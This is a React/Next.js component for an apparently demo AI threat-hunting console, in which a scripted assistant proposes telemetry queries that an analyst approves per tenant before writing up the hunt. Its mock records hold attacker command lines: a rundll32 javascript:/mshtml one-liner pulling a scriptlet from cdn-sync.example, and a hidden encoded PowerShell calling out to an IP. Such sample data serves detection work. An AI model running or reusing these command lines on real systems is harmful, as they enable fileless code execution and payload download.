"use client";
import { useEffect, useRef, useState } from "react";
import Link from "next/link";
import { ArrowUp, BookOpen, Check, KeyRound, Lock, ShieldAlert, Sparkles, X, GitCommitHorizontal, Crosshair } from "lucide-react";
import { Badge, Button, Code, Maturity } from "@/components/ui";
import { useHunter, allTenants } from "@/lib/store";
import { promptLibrary, tenantById, vendorLabel, type Tenant } from "@/lib/data";
import { cx } from "@/lib/format";

/* ---------- session model ---------- */
type Phase = "learn" | "observe" | "check" | "keep";
type LaneState = "proposed" | "approved" | "denied" | "running" | "done";
interface Lane { tenantId: string; state: LaneState; records: Rec[]; vendor: string; latency: number }
interface Rec { host: string; time: string; process: string; cmd: string; parent: string; user: string }
type Msg =
  | { kind: "user"; text: string }
  | { kind: "assistant"; text: string; phase: Phase }
  | { kind: "context"; tenantIds: string[] }
  | { kind: "tool"; id: number; tool: "telemetry.query" | "telemetry.enrich"; params: string; lanes: Lane[]; standing?: boolean }
  | { kind: "keep" };

const hosts = ["WKS-04821", "WKS-04833", "WKS-05102", "FIN-LT-0221", "CLN-WS-1183", "ENG-WS-0311", "DSP-TERM-07"];
function fakeRecords(t: Tenant, n: number): Rec[] {
  const seed = t.name.length;
  return Array.from({ length: n }, (_, i) => ({
    host: hosts[(seed + i * 3) % hosts.length],
    time: `2026-09-0${(i % 3) + 1} ${String(8 + ((seed + i * 5) % 11)).padStart(2, "0")}:${String((seed * 7 + i * 13) % 60).padStart(2, "0")}`,
    process: "rundll32.exe",
    cmd: i % 3 === 2 ? "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";eval(...)" : "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://cdn-sync.example/a.sct\")",
    parent: "outlook.exe",
    user: ["jsmith", "rbrooks", "hvogel", "tmurphy"][(seed + i) % 4],
  }));
}
const countFor = (t: Tenant) => ({ acme: 3, globex: 0, initech: 1, umbrella: 0, vandelay: 0, stark: 2 }[t.slug] ?? 0);

export function HuntSession() {
  const { scope, toast } = useHunter();
  const tenants = scope.length ? allTenants.filter((t) => scope.includes(t.id)) : allTenants;
  const [msgs, setMsgs] = useState<Msg[]>([]);
  const [phase, setPhase] = useState<Phase>("learn");
  const [input, setInput] = useState("");
  const [busy, setBusy] = useState(false);
  const [creds, setCreds] = useState(0);
  const [kept, setKept] = useState<null | string>(null);
  const [keepRepo, setKeepRepo] = useState("tenant-acme");
  const [outcome, setOutcome] = useState<"true_positive" | "false_positive" | "inconclusive">("true_positive");
  const endRef = useRef<HTMLDivElement>(null);
  const idRef = useRef(1);

  useEffect(() => { endRef.current?.scrollIntoView({ behavior: "smooth", block: "end" }); }, [msgs, busy]);

  const push = (m: Msg) => setMsgs((s) => [...s, m]);
  const wait = (ms: number) => new Promise((r) => setTimeout(r, ms));

  async function submit(text: string) {
    if (!text.trim() || busy) return;
    setInput("");
    push({ kind: "user", text });
    setBusy(true);
    await wait(500);
    push({ kind: "context", tenantIds: tenants.map((t) => t.id) });
    await wait(900);
    push({ kind: "assistant", phase: "learn", text: `Context loaded for ${tenants.length === 1 ? tenants[0].name : `${tenants.length} tenants`}. No prior hunts cover rundll32 script-protocol execution. Hypothesis: a phishing document spawns rundll32.exe with a javascript: argument to run script filelessly. I'll start with process executions where rundll32 was launched with javascript: in the command line over the last 48 hours, then pivot on parents and network.` });
    await wait(700);
    setPhase("observe");
    push({
      kind: "tool", id: idRef.current++, tool: "telemetry.query",
      params: `{
  "query_type": "process_execution",
  "time_range": { "start": "2026-09-06T13:45:00Z", "end": "2026-09-08T13:45:00Z" },
  "filters": {
    "process_name": ["rundll32.exe"],
    "command_line_contains": ["javascript:"]
  },
  "limit": 500
}`,
      lanes: tenants.map((t) => ({ tenantId: t.id, state: "proposed", records: [], vendor: t.vendors[0], latency: 600 + (t.name.length * 97) % 900 })),
    });
    setBusy(false);
  }

  function setLane(msgId: number, tenantId: string, patch: Partial<Lane>) {
    setMsgs((s) => s.map((m) => (m.kind === "tool" && m.id === msgId ? { ...m, lanes: m.lanes.map((l) => (l.tenantId === tenantId ? { ...l, ...patch } : l)) } : m)));
  }

  async function approve(msgId: number, tenantId: string, forSession = false) {
    const t = tenantById(tenantId);
    setLane(msgId, tenantId, { state: "approved" });
    setCreds((c) => c + 1);
    toast(`${forSession ? "Approved for this session" : "Approved"}. 5-minute credential issued for ${t.name} · ${vendorLabel[t.vendors[0]]}.`);
    await wait(300);
    setLane(msgId, tenantId, { state: "running" });
    await wait(900 + (t.name.length * 97) % 900);
    setLane(msgId, tenantId, { state: "done", records: fakeRecords(t, countFor(t)) });
    setCreds((c) => Math.max(0, c - 1));
  }
  function deny(msgId: number, tenantId: string) {
    setLane(msgId, tenantId, { state: "denied" });
    toast("Denied. Nothing was executed. Decision recorded in the audit log.", "warn");
  }

  // when all lanes of the latest query tool are settled, continue the script
  const lastTool = [...msgs].reverse().find((m): m is Extract<Msg, { kind: "tool" }> => m.kind === "tool");
  const settled = lastTool && lastTool.lanes.every((l) => l.state === "done" || l.state === "denied");
  const continued = useRef<Set<number>>(new Set());
  useEffect(() => {
    if (!lastTool || !settled || continued.current.has(lastTool.id)) return;
    continued.current.add(lastTool.id);
    (async () => {
      setBusy(true);
      await wait(800);
      if (lastTool.tool === "telemetry.query") {
        const hits = lastTool.lanes.reduce((n, l) => n + l.records.length, 0);
        const withHits = lastTool.lanes.filter((l) => l.records.length).map((l) => tenantById(l.tenantId).name);
        if (hits === 0) {
          push({ kind: "assistant", phase: "check", text: "No matches. rundll32 with a javascript: argument has not executed in the last 48 hours across the selected scope. I'd suggest widening the window to 14 days or adding mshta and regsvr32 to the process filter. If you'd rather close this out, I can write it up as a coverage note." });
          setPhase("keep"); push({ kind: "keep" }); setBusy(false); return;
        }
        push({ kind: "assistant", phase: "check", text: `${hits} execution${hits > 1 ? "s" : ""} matched in ${withHits.join(" and ")}. Every one was parented by outlook.exe, which never legitimately launches rundll32 in this environment. The command line pulls a scriptlet from cdn-sync.example. I want to enrich the first host to see what rundll32 spawned next and where it connected.` });
        await wait(600);
        setPhase("check");
        const first = lastTool.lanes.find((l) => l.records.length)!;
        push({
          kind: "tool", id: idRef.current++, tool: "telemetry.enrich", standing: true,
          params: `{ "entity_type": "host", "entity_id": "${first.records[0].host}", "pivot": ["child_processes", "network_connections"], "window_minutes": 30 }`,
          lanes: [{ tenantId: first.tenantId, state: "running", records: [], vendor: first.vendor, latency: 420 }],
        });
        setCreds((c) => c + 1);
        await wait(1500);
        setMsgs((s) => s.map((m) => (m.kind === "tool" && m.tool === "telemetry.enrich" ? { ...m, lanes: m.lanes.map((l) => ({ ...l, state: "done", records: [{ host: first.records[0].host, time: first.records[0].time, process: "powershell.exe", cmd: "powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...", parent: "rundll32.exe", user: first.records[0].user }, { host: first.records[0].host, time: first.records[0].time, process: "powershell.exe → 185.220.101.4:443", cmd: "network_connection outbound, 4 connections, 2.1 KB", parent: "powershell.exe", user: first.records[0].user }] })) } : m)));
        setCreds((c) => Math.max(0, c - 1));
        await wait(700);
        push({ kind: "assistant", phase: "keep", text: `That confirms it. rundll32 spawned a hidden, encoded PowerShell that connected to 185.220.101.4 over 443. Intel has that address on a known Tor exit list. This is a phishing-to-loader chain and I'd call it a true positive on ${first.records[0].host}. Ready to write the hunt record and, if you want, draft a Sigma rule for the rundll32 javascript: pattern.` });
        setKeepRepo(tenantById(first.tenantId).repo);
        setPhase("keep");
        push({ kind: "keep" });
      }
      setBusy(false);
    })();
  }, [lastTool, settled]);

  function keep() {
    setKept("c41e9b2");
    toast(`Hunt record H-0143 committed to ${keepRepo}/hunts. Audit trail linked.`);
  }

  const started = msgs.length > 0;

  return (
    <div className="grid grid-cols-[1fr_300px] gap-6 -my-7 -mx-8 h-[calc(100vh-64px)] overflow-hidden">
      {/* transcript */}
      <div className="flex flex-col min-w-0 min-h-0 border-r border-seam/60">
        <div className="flex-1 min-h-0 overflow-y-auto px-8 pt-6 pb-4">
          {!started ? (
            <Idle tenants={tenants} onPick={(p) => setInput(p)} />
          ) : (
            <div className="max-w-[860px] mx-auto space-y-5">
              {msgs.map((m, i) => <Message key={i} m={m} onApprove={approve} onDeny={deny} kept={kept} keep={keep} keepRepo={keepRepo} outcome={outcome} setOutcome={setOutcome} />)}
              {busy && <div className="flex items-center gap-2 text-muted text-[13px] pl-1"><span className="h-1.5 w-1.5 rounded-full bg-ice live-dot" /> Reasoning</div>}
              <div ref={endRef} />
            </div>
          )}
        </div>
        <div className="px-8 pb-6 pt-2">
          <form onSubmit={(e) => { e.preventDefault(); submit(input); }} className="max-w-[860px] mx-auto">
            <div className="panel p-2 pl-4 flex items-end gap-2 focus-within:border-seam-2 focus-within:shadow-[0_0_0_3px_rgba(143,208,255,0.10)] transition-shadow">
              <textarea value={input} onChange={(e) => setInput(e.target.value)} onKeyDown={(e) => { if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); submit(input); } }} rows={2} placeholder={started ? "Refine the hypothesis, pivot, or ask for a summary" : "Describe what you're hunting for"} className="flex-1 bg-transparent resize-none outline-none text-[14px] leading-relaxed placeholder:text-faint py-2" />
              <Button type="submit" variant="primary" size="md" disabled={!input.trim() || busy} className="w-9 px-0 rounded-[9px]" aria-label="Send"><ArrowUp size={16} /></Button>
            </div>
            <div className="flex items-center gap-3 mt-2 text-[12px] text-faint px-1">
              <span className="inline-flex items-center gap-1.5"><Lock size={11} /> Every query needs your approval before it runs.</span>
              <span className="ml-auto">Scope: {tenants.map((t) => t.name).join(", ")}</span>
            </div>
          </form>
        </div>
      </div>

      {/* right rail */}
      <aside className="min-h-0 overflow-y-auto py-6 pr-8 space-y-6">
        <div>
          <div className="text-[12px] text-muted mb-2">LOCK cycle</div>
          <ol className="relative border-l border-seam ml-1.5">
            {(["learn", "observe", "check", "keep"] as Phase[]).map((p) => {
              const order = ["learn", "observe", "check", "keep"];
              const done = order.indexOf(p) < order.indexOf(phase) && started;
              const current = p === phase && started;
              return (
                <li key={p} className="pl-4 pb-4 last:pb-0 relative">
                  <span className={cx("absolute -left-[5px] top-1.5 h-[9px] w-[9px] rounded-full border", current ? "bg-ice border-ice shadow-[0_0_10px_2px_rgba(143,208,255,0.5)]" : done ? "bg-signal border-signal" : "bg-abyss border-seam-2")} />
                  <div className={cx("text-[13.5px] font-medium capitalize", current ? "text-text" : done ? "text-signal" : "text-faint")}>{p}</div>
                  <div className="text-[12px] text-faint mt-0.5">{{ learn: "Tenant context and prior hunts", observe: "Scoped, approved queries", check: "Enrich and decide", keep: "Write the record to git" }[p]}</div>
                </li>
              );
            })}
          </ol>
        </div>

        <div>
          <div className="text-[12px] text-muted mb-2">Scope</div>
          <ul className="space-y-1.5">
            {tenants.map((t) => (
              <li key={t.id} className="panel-quiet px-3 py-2 flex items-center gap-2 text-[13px]">
                <span className="flex-1 truncate">{t.name}</span>
                <Maturity level={t.maturity} compact />
              </li>
            ))}
          </ul>
          {tenants.length > 1 && <p className="text-[12px] text-faint mt-2 leading-relaxed">Fan-out: each tenant runs in its own session with its own credential. Nothing is shared between lanes.</p>}
        </div>

        <div>
          <div className="text-[12px] text-muted mb-2">Credentials</div>
          <div className="panel-quiet px-3 py-2.5 flex items-center gap-2.5 text-[13px]">
            <KeyRound size={14} className={creds ? "text-ember" : "text-faint"} />
            <span className="flex-1">{creds ? `${creds} active` : "None outstanding"}</span>
            <span className="text-[11.5px] text-faint">5 min TTL</span>
          </div>
        </div>

        <div>
          <div className="text-[12px] text-muted mb-2">Session</div>
          <ul className="text-[12.5px] text-muted space-y-1.5">
            <li className="flex justify-between"><span>Analyst</span><span className="text-text">Paul Runtalan</span></li>
            <li className="flex justify-between"><span>Session</span><span className="mono text-text">ses_7f3a…c1</span></li>
            <li className="flex justify-between"><span>Audited events</span><span className="num text-text">{msgs.filter((m) => m.kind === "tool").reduce((n, m) => n + (m.kind === "tool" ? m.lanes.filter((l) => l.state !== "proposed").length * 3 : 0), 0)}</span></li>
          </ul>
          <Link href="/audit" className="text-[12.5px] text-ice mt-2 inline-block">View audit trail</Link>
        </div>
      </aside>
    </div>
  );
}

/* ---------- idle hero ---------- */
function Idle({ tenants, onPick }: { tenants: Tenant[]; onPick: (p: string) => void }) {
  return (
    <div className="h-full flex flex-col items-center justify-center max-w-[860px] mx-auto">
      <div className="relative h-44 w-44 mb-6">
        <div className="absolute inset-0 grid-bg" />
        {[0, 1, 2].map((i) => <span key={i} className="sonar-ring absolute inset-0 rounded-full border border-ice/40" />)}
        <div className="absolute inset-[22%] rounded-full border border-seam-2" />
        <div className="sweep absolute inset-[22%] rounded-full" style={{ background: "conic-gradient(from 0deg, rgba(143,208,255,0.25), transparent 80deg)" }} />
        <Crosshair size={22} className="absolute left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2 text-signal" strokeWidth={1.6} />
      </div>
      <h1 className="text-[28px] font-semibold tracking-[-0.03em]">What are you hunting for?</h1>
      <p className="text-muted text-[14px] mt-2 text-center max-w-[52ch]">Write a hypothesis in plain language. The assistant will load {tenants.length === 1 ? `${tenants[0].name}'s` : `context for each of the ${tenants.length} tenants in scope`}, propose scoped queries, and wait for your approval before anything runs.</p>
      <div className="mt-8 w-full grid sm:grid-cols-2 gap-2.5">
        {promptLibrary.map((p) => (
          <button key={p.id} onClick={() => onPick(p.prompt)} className="text-left panel-quiet hover:bg-hull/70 transition-colors px-4 py-3">
            <div className="flex items-center gap-2 text-[13px] font-medium"><BookOpen size={13} className="text-ice" />{p.title}<span className="mono text-[11px] text-faint ml-auto">{p.id}</span></div>
            <div className="text-[12.5px] text-muted mt-1 line-clamp-2">{p.prompt}</div>
          </button>
        ))}
      </div>
    </div>
  );
}

/* ---------- messages ---------- */
function Message({ m, onApprove, onDeny, kept, keep, keepRepo, outcome, setOutcome }: { m: Msg; onApprove: (id: number, t: string, s?: boolean) => void; onDeny: (id: number, t: string) => void; kept: string | null; keep: () => void; keepRepo: string; outcome: string; setOutcome: (o: "true_positive" | "false_positive" | "inconclusive") => void }) {
  if (m.kind === "user") return (
    <div className="rise flex justify-end"><div className="max-w-[70%] bg-cobalt/20 border border-cobalt/30 rounded-[16px] rounded-br-[6px] px-4 py-3 text-[14px] leading-relaxed">{m.text}</div></div>
  );
  if (m.kind === "context") return (
    <div className="rise flex flex-wrap items-center gap-2 text-[12.5px] text-muted pl-1">
      <BookOpen size={13} className="text-ice" /> Loaded
      {m.tenantIds.map((id) => <span key={id} className="mono text-[11.5px] text-ice-2/80 bg-hull border border-seam rounded-md px-1.5 py-0.5">{tenantById(id).repo}/context/AGENTS.md</span>)}
      <span>and the last 30 days of hunt records</span>
    </div>
  );
  if (m.kind === "assistant") return (
    <div className="rise flex gap-3">
      <div className="h-7 w-7 rounded-full bg-hull border border-seam flex items-center justify-center shrink-0 mt-0.5"><Sparkles size={13} className="text-ice" /></div>
      <div className="max-w-[78%]">
        <div className="text-[11.5px] text-faint mb-1 capitalize">{m.phase}</div>
        <p className="text-[14px] leading-relaxed">{m.text}</p>
      </div>
    </div>
  );
  if (m.kind === "keep") return <KeepCard repo={keepRepo} kept={kept} keep={keep} outcome={outcome} setOutcome={setOutcome} />;
  return <ToolCard m={m} onApprove={onApprove} onDeny={onDeny} />;
}

function ToolCard({ m, onApprove, onDeny }: { m: Extract<Msg, { kind: "tool" }>; onApprove: (id: number, t: string, s?: boolean) => void; onDeny: (id: number, t: string) => void }) {
  const [showParams, setShowParams] = useState(false);
  const pendingCount = m.lanes.filter((l) => l.state === "proposed").length;
  return (
    <div className="rise panel overflow-hidden ml-10">
      <div className="flex items-center gap-3 px-4 py-3 border-b border-seam">
        <span className={cx("w-1 h-5 rounded-full", pendingCount ? "bg-ember" : "bg-signal")} />
        <span className="mono text-[13px] text-ice-2">{m.tool}</span>
        {m.standing ? <Badge tone="ice">Standing session grant · logged</Badge> : pendingCount ? <Badge tone="ember" dot>Awaiting approval</Badge> : <Badge tone="signal">Approved</Badge>}
        <button onClick={() => setShowParams((s) => !s)} className="ml-auto text-[12.5px] text-muted hover:text-text">{showParams ? "Hide parameters" : "Parameters"}</button>
      </div>
      {showParams && <div className="p-3 border-b border-seam"><Code>{m.params}</Code></div>}
      <ul className="divide-y divide-seam/70">
        {m.lanes.map((l) => <LaneRow key={l.tenantId} lane={l} standing={!!m.standing} approve={(s) => onApprove(m.id, l.tenantId, s)} deny={() => onDeny(m.id, l.tenantId)} />)}
      </ul>
      {pendingCount > 1 && (
        <div className="px-4 py-2.5 border-t border-seam flex items-center justify-between text-[12.5px] text-muted">
          <span>{pendingCount} tenants waiting. Each approval issues its own credential.</span>
          <Button size="sm" variant="primary" onClick={() => m.lanes.filter((l) => l.state === "proposed").forEach((l) => onApprove(m.id, l.tenantId))}>Approve all</Button>
        </div>
      )}
    </div>
  );
}

function LaneRow({ lane, standing, approve, deny }: { lane: Lane; standing: boolean; approve: (s?: boolean) => void; deny: () => void }) {
  const t = tenantById(lane.tenantId);
  return (
    <li className="px-4 py-3">
      <div className="flex items-center gap-3">
        <div className="min-w-0 flex-1">
          <span className="text-[13.5px] font-medium">{t.name}</span>
          <span className="text-[12.5px] text-muted"> · {vendorLabel[lane.vendor as keyof typeof vendorLabel]} · <span className="mono">tenant-{t.slug}</span></span>
        </div>
        {lane.state === "proposed" && !standing && (
          <div className="flex items-center gap-1.5">
            <Button size="sm" variant="ghost" onClick={deny}><X size={13} /> Deny</Button>
            <Button size="sm" onClick={() => approve(true)}>Approve for session</Button>
            <Button size="sm" variant="primary" onClick={() => approve()}><Check size={13} /> Approve</Button>
          </div>
        )}
        {lane.state === "approved" && <span className="text-[12.5px] text-ember inline-flex items-center gap-1.5"><KeyRound size={13} /> Issuing credential</span>}
        {lane.state === "running" && <span className="text-[12.5px] text-ice inline-flex items-center gap-1.5"><span className="h-1.5 w-1.5 rounded-full bg-ice live-dot" /> Running on {vendorLabel[lane.vendor as keyof typeof vendorLabel]}</span>}
        {lane.state === "denied" && <Badge tone="flare">Denied</Badge>}
        {lane.state === "done" && <span className="text-[12.5px] text-muted"><span className={cx("num font-medium", lane.records.length ? "text-flare" : "text-signal")}>{lane.records.length} record{lane.records.length === 1 ? "" : "s"}</span> · {lane.latency} ms</span>}
      </div>
      {lane.state === "done" && lane.records.length > 0 && (
        <div className="mt-3 rounded-[10px] border border-seam overflow-hidden">
          <table className="data">
            <thead><tr><th>Host</th><th>Time</th><th>Process</th><th>Parent</th><th>User</th></tr></thead>
            <tbody>
              {lane.records.map((r, i) => (
                <tr key={i}>
                  <td className="mono text-[12.5px] text-ice-2">{r.host}</td>
                  <td className="mono text-[12px] text-muted whitespace-nowrap">{r.time}</td>
                  <td><div className="mono text-[12.5px]">{r.process}</div><div className="mono text-[11.5px] text-faint truncate max-w-[380px]" title={r.cmd}>{r.cmd}</div></td>
                  <td className="mono text-[12.5px]">{r.parent}</td>
                  <td className="mono text-[12.5px] text-muted">{r.user}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </li>
  );
}

function KeepCard({ repo, kept, keep, outcome, setOutcome }: { repo: string; kept: string | null; keep: () => void; outcome: string; setOutcome: (o: "true_positive" | "false_positive" | "inconclusive") => void }) {
  return (
    <div className="rise panel ml-10 overflow-hidden">
      <div className="flex items-center gap-3 px-4 py-3 border-b border-seam">
        <GitCommitHorizontal size={15} className="text-ice" />
        <span className="text-[13.5px] font-medium">Keep: write the hunt record</span>
        <span className="mono text-[12px] text-muted ml-auto">{repo}/hunts/H-0143-rundll32-javascript.md</span>
      </div>
      {kept ? (
        <div className="px-4 py-4">
          <div className="flex items-center gap-2 text-[13.5px] text-signal"><Check size={15} /> Committed <span className="mono text-ice-2">{kept}</span> to {repo}. Hunt H-0143 is now in the index.</div>
          <div className="mt-4 flex flex-wrap gap-2">
            <Link href="/detections/8f2c1a4e"><Button variant="primary" size="sm"><ShieldAlert size={13} /> Draft a Sigma rule from this hunt</Button></Link>
            <Link href="/hunts/H-0142"><Button size="sm">Open the record</Button></Link>
          </div>
        </div>
      ) : (
        <div className="px-4 py-4">
          <div className="text-[12.5px] text-muted mb-2">Outcome</div>
          <div className="flex gap-2 mb-4">
            {([["true_positive", "True positive"], ["false_positive", "False positive"], ["inconclusive", "Inconclusive"]] as const).map(([v, l]) => (
              <button key={v} onClick={() => setOutcome(v)} className={cx("h-8 px-3 rounded-[9px] border text-[12.5px] font-medium", outcome === v ? "border-ice/40 bg-ice/10 text-ice-2" : "border-seam text-muted hover:text-text")}>{l}</button>
            ))}
          </div>
          <div className="text-[12.5px] text-muted leading-relaxed">The record captures the four LOCK phases, every approved query with its approval id, and the hosts involved. It commits directly to the tenant's default branch and is attributed to you.</div>
          <div className="mt-4"><Button variant="primary" onClick={keep}><GitCommitHorizontal size={14} /> Commit hunt record</Button></div>
        </div>
      )}
    </div>
  );
}
